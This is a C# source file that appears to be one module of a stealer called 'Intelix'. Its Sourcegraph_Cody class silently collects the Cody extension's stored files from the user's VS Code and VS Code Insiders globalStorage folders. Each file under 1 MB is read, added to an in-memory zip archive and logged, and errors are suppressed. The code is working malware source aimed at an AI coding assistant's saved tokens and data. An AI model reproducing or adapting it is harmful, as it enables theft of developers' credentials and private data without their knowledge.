using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Sourcegraph_Cody : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var entry = new Counter.CounterApplications { Name = "Sourcegraph Cody" };
            string[] vscodeDirs = { "Code", "Code - Insiders" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string dir = Path.Combine(appdata, vscodeDir, "User", "globalStorage", "sourcegraph.cody-ai");
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Cody\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
